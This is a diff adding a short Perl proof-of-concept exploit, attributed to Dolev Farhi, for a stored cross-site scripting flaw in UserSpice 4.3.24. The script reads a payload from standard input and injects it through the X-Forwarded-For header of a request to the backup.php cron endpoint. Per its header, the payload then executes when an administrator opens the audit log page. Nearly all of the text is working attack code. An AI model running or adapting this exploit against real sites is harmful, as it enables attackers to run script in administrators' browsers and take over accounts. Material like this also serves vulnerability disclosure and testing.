@@ -1,0 +1,46 @@
+# Exploit Title: userSpice 4.3.24 - 'X-Forwarded-For' Cross-Site Scripting
+# Date: 2018-06-10
+# Author: Dolev Farhi
+# Vendor or Software Link: www.userspice.com
+# Version: 4.3.24
+# Tested on: Ubuntu
+# Payload will get executed when admin visits the audit log page
+
+#!/usr/bin/perl
+
+use strict;
+use LWP::UserAgent;
+
+print "UserSpice 4.3.24 X-Forwarded-For XSS PoC\n";
+
+if ($#ARGV != 0 ) {
+	print "usage: $0 <address> \n";
+	exit 1;
+}
+
+my $server   = $ARGV[0] . "/users/cron/backup.php?from=users/cron_manager.php/";
+my $ua = LWP::UserAgent->new;
+my $req = HTTP::Request->new(GET => 'http://' . $server);
+
+print "Enter payload: ";
+
+my $xff = <STDIN>;
+chomp $xff;
+
+if ($xff eq "")
+{
+ print "Empty payload \n";
+ exit 1;
+}
+
+$req->header('X-Forwarded-For' => $xff);
+
+my $resp = $ua->request($req);
+if ($resp->is_success) {
+    print "[OK] Sent payload: $xff\n";
+    exit 0;
+}
+else {
+    print "[Error]: code: ", $resp->code, $resp->message, "\n";
+    exit 1;
+}
